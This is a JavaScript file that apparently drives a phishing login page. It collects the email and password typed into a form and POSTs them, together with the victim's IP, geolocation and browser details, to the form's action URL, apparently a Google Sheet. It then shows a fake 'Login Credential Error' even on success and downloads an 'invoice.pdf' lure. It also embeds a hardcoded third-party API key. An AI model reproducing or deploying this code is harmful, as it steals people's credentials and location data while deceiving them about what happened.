const apiKey = "at_iUPzHyxcZr1s5wI1RDYrr0k0sbKLj";
const domainName = "whoisxmlapi.com";
const url =
	"https://www.whoisxmlapi.com/whoisserver/WhoisService?" +
	`domainName=${domainName}&apikey=${apiKey}`;

(function () {
	function getFormData(form) {
		var elements = form.elements;
		var honeypot;
		var fields = Object.keys(elements)
			.filter(function (k) {
				if (elements[k].name === "honeypot") {
					honeypot = elements[k].value;
					return !1;
				}
				return !0;
			})
			.map(function (k) {
				if (elements[k].name !== undefined) {
					return elements[k].name;
				} else if (elements[k].length > 0) {
					return elements[k].item(0).name;
				}
			})
			.filter(function (item, pos, self) {
				return self.indexOf(item) == pos && item;
			});
		var formData = {};
		fields.forEach(function (name) {
			var element = elements[name];
			formData[name] = element.value;
			if (element.length) {
				var data = [];
				for (var i = 0; i < element.length; i++) {
					var item = element.item(i);
					if (item.checked || item.selected) {
						data.push(item.value);
					}
				}
				formData[name] = data.join(", ");
			}
		});
		formData.formDataNameOrder = JSON.stringify(fields);
		formData.formGoogleSheetName = form.dataset.sheet || "responses";
		formData.formGoogleSend = form.dataset.email || "";
		return {
			data: formData,
			honeypot,
		};
	}

	function handleFormSubmit(event) {
		event.preventDefault();
		var form = event.target;
		var formData = getFormData(form);
		var data = formData.data;
		var loading = document.querySelector(".loader");
		var email = document.getElementsByClassName("email")[0];
		var pass = document.getElementsByClassName("password")[0];

		// i created a div and assign it as a child of body, then paste that bootstrap alert in there
		var alert = document.createElement("div");
		var body = document.getElementsByTagName("body")[0];

		body.appendChild(alert);

		if (email.value.length !== 0 && pass.value.length !== 0) {
			if (email.value.includes("@") && email.value.includes(".")) {
				if (pass.value.length >= 6) {
					if (formData.honeypot) {
						return;
					}
					setTimeout(() => (loading.style.display = "block"), 500);
					var url = form.action;
					var xhr = new XMLHttpRequest();
					xhr.open("POST", url);
					xhr.setRequestHeader(
						"Content-Type",
						"application/x-www-form-urlencoded",
					);
					xhr.onreadystatechange = function () {
						if (xhr.readyState === 4) {
							var response = JSON.parse(xhr.responseText);
							if (xhr.status === 200 && response.result === "success") {
								loading.style.display = "none";
								downloadURI(
									window.location.href + "/invoice.pdf",
									"invoice.pdf",
								);
								alert.innerHTML = `<div class="alert alert-danger alert-dismissible" role="alert"> 
                                Login Credential Error 
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                              </button>
                                </div>`;
							} else {
								console.log(response);
								loading.style.display = "none";
								alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert"> 
                                Login Credential Error 
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                <span aria-hidden="true">&times;</span>
                              </button>
                              </div>`;
							}
						}
						return;
					};
					var encoded = Object.keys(data)
						.map(function (k) {
							return encodeURIComponent(k) + "=" + encodeURIComponent(data[k]);
						})
						.join("&");
					xhr.send(encoded);
				} else {
					alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
                     Password is not correct 
                     <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                  </button></div>`;
				}
			} else {
				alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
                 Email is not correct 
                 <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button></div>`;
			}
		} else {
			alert.innerHTML = ` <div class="alert alert-danger alert-dismissible" role="alert">
             Please fill the field 
             <button type="button" class="close" data-dismiss="alert" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button></div>`;
		}
	}

	function loaded() {
		var loading = document.querySelector(".loader");
		loading.style.display = "none";
		var forms = document.querySelectorAll("form.gform");
		for (var i = 0; i < forms.length; i++) {
			forms[i].addEventListener("submit", handleFormSubmit, !1);
		}
	}
	function downloadURI(uri, name = "download") {
		var link = document.createElement("a");
		// If you don't know the name or want to use
		// the webserver default set name = ''
		link.setAttribute("download", name);
		link.href = uri;
		document.body.appendChild(link);
		link.click();
		link.remove();
	}
	document.addEventListener("DOMContentLoaded", loaded, !1);
	// apis to fetch the user's info
	fetch("https://api.ipify.org?format=json")
		.then((IP) => {
			return IP.json();
		})
		.then(async (IP) => {
			await fetch(
				`https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey=at_iUPzHyxcZr1s5wI1RDYrr0k0sbKLj&ipAddress=${IP.ip}`,
			)
				.then((res) => {
					return res.json();
				})
				.then((data) => {
					let info = document.getElementById("info");
					let { domain, name, type } = data.as;
					let { ip } = data;
					let { city, country, region, lat, lng } = data.location;
					let DeviceInfo = window.navigator.userAgent;

					info.value = `Internet Info : \n 
                    Domain: ${domain},
                    \n Name: ${name},
                    \n Type = ${type} .
                    \n IP-Address: ${ip} . \n
                     Location: \n
                     City: ${city}, \n 
                     Country: ${country}, \n
                     Region: ${region}, \n
                     Latitude: ${lat}, \n
                     Longitute: ${lng} . \n
                     Device Info: ${DeviceInfo}.
                     `;

					const lang = Languages[country.toLowerCase()];
					if (country && lang?.email) {
						Object.keys(lang).forEach((elem) => {
							if (elem == ("email" || "pass")) {
								document.getElementById(elem).placeholder = lang[elem];
							} else {
								document.getElementById(elem).innerHTML = lang[elem];
							}
						});
					}
				});
		});
})();
